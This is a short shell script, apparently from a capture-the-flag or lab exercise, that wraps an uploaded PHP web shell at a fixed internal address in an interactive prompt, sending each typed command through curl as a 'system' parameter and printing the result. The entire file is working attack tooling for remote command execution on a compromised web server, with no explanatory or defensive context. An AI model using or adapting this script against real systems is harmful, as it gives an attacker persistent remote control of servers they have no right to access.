#!/bin/sh

while true; do
 echo -n "$ "; read cmd
 curl --silent -G 'http://10.10.10.198:8080/upload/shell.php' --data-urlencode "system=${cmd}"; echo "\n"
done
